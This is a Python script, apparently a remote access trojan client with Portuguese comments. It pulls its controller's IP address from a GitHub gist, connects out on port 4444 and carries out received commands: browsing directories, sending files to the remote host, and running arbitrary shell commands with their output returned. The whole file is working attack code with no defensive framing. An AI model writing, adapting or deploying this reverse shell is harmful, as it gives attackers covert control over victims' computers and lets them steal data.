import socket  
import os
import subprocess
import requests

GIST_RAW_URL = "https://gist.githubusercontent.com/daviwll/a8c3564129a5db5ba5e5adcae70cea4b/raw/fd05499963671eb0c5cef4d1c31f27fddd89362d/ip.txt"

def get_server_ip():
    try:
        response = requests.get(GIST_RAW_URL)
        return response.text.strip()
    except:
        return None

def connect_server():
    host = get_server_ip() 

    if not host:
        print("Não foi possível obter o IP do servidor.")
        return
  
    port = 4444  # Porta TCP

    try:
        s = socket.socket()  # Criação do socket
        s.connect((host, port))  # Conexão com o servidor

        # Recebe o IP do servidor enviado logo após a conexão
        server_ip_message = s.recv(1024).decode()

        if server_ip_message.startswith("SERVER_IP"):
            server_ip = server_ip_message.split()[1]
            print(f"Conectando ao servidor no IP: {server_ip}")
            s.close()  # Fecha a conexão antiga
            s = socket.socket()  # Cria um novo socket para a nova conexão com o IP do servidor
            s.connect((server_ip, port))  # Conecta-se ao IP recebido

        while True:
            command = s.recv(1024).decode()  # Recebe comandos do servidor
            
            if command.startswith("cd "):  # Navega entre as pastas
                try:
                    path = command[3:]
                    os.chdir(path)
                    s.send(f"[OK] Current path: {os.getcwd()}".encode())

                except Exception as e:
                    s.send(f"[ERROR ☠️] {e}".encode())

            elif command == 'ls':
                try:
                    files = "\n".join(os.listdir())
                    s.send(files.encode())
                except Exception as e:
                    s.send(f"[ERROR ☠️] {e}".encode())

            elif command.startswith("get "):
                archive_name = command[4:]
                if os.path.exists(archive_name):
                    with open(archive_name, "rb") as f:
                        data = f.read()
                        s.sendall(data)
                        s.send(b"<EOF>")
                else:
                    s.send(f"[ERROR ☠️] Arquivo não encontrado.")

            elif command.startswith("exec "):
                cmd = command[5:]
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except subprocess.CalledProcessError as e:
                    s.send(e.output)
            elif command == "exit":
                s.send(b"[!] Desconectando.")
                break
            else:
                s.send(b"[ERRO] Comando desconhecido.")

    except Exception as e:
        print("Erro ao conectar:", e)
    finally:
        s.close()
        print("[*] Conexão encerrada.")

if __name__ == "__main__":
    connect_server()
